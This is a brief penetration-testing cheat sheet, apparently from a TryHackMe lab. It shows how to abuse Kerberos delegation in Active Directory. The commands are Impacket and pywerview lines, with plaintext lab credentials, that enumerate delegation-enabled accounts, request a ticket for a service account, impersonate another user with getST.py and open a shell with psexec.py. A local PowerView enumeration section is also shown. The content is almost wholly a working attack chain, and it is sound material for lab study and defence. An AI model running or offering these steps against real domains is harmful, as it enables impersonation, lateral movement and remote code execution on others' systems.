# Resource-based Constrained Delegation

#### Remote
*This uses Impacket & Pywerview*

Find Accounts that can delegate

```
pywerview get-netuser -u t2_melanie.davies -p Password123! -d za.tryhackme.loc --dc-ip 10.200.79.101 > get-netuser.txt 
```

Look for: 

```
useraccountcontrol: ['TRUSTED_TO_AUTH_FOR_DELEGATION']
msds-allowedtodelegateto: services-which-can-be-delegated
```

Create TGT for service account:

```
getTGT.py za.tryhackme.loc/svciis:Password1@  -dc-ip 10.200.19.101 
```

```
getST.py -impersonate t1_steven.blake -dc-ip 10.200.19.101 -spn http/THMSERVER1.za.tryhackme.loc
```

```
psexec.py -k -no-pass za.tryhackme.loc/t1_steven.blake@thmserver1.za.tryhackme.loc -dc-ip 10.200.19.101 
```

#### Local
*This uses Powerview, Mimikatz & Kekeo*

Enumeration

```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```